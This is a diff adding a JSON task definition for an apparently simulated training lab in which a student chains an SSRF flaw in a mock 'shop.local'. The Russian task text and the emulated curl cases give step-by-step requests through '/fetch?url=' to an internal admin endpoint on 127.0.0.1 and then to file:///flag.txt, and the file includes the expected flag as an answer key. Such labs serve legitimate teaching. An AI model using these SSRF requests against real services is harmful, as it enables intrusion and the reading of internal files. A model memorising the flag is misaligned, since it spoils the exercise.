@@ -1,0 +1,23 @@
+{
+  "id": "web-attack-chains",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{ch41n_ssrf_t0_1nt3rn4l_rce}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: цепочка атак — SSRF → internal → чтение секрета\n\n`shop.local` умеет ходить по URL за пользователя (`/fetch?url=`). Это SSRF.\nПроведи цепочку: внутренний сервис → локальный файл.\n\n1. Есть ли вывод у SSRF (внутренний health):\n\n   curl -s 'https://shop.local/fetch?url=http://127.0.0.1:8080/health'\n\n2. Внутренний админ-эндпоинт:\n\n   curl -s 'https://shop.local/fetch?url=http://127.0.0.1:8080/admin'\n\n3. Читаем локальный файл через file:// и завершаем цепочку:\n\n   curl -s 'https://shop.local/fetch?url=file:///flag.txt' > found.txt\n\n4. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция SSRF-фасада shop.local)",
+      "cases": [
+        { "match": "file://|flag\\.txt|file%3a", "example": "-s 'https://shop.local/fetch?url=file:///flag.txt'", "output": "nto{ch41n_ssrf_t0_1nt3rn4l_rce}\n" },
+        { "match": "8080/admin", "example": "-s 'https://shop.local/fetch?url=http://127.0.0.1:8080/admin'", "output": "<h1>Internal admin</h1><p>auth via loopback trusted</p>\n" },
+        { "match": "8080/health", "example": "-s 'https://shop.local/fetch?url=http://127.0.0.1:8080/health'", "output": "{\"status\":\"ok\",\"service\":\"internal-api\"}\n" },
+        { "match": "fetch\\?url=", "example": "-s 'https://shop.local/fetch?url=http://example.com/'", "output": "<html>example.com</html>\n" },
+        { "match": "shop\\.local", "example": "-s https://shop.local/", "output": "<!doctype html><title>shop</title>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется SSRF-фасад shop.local.\n"
+    }
+  }
+}
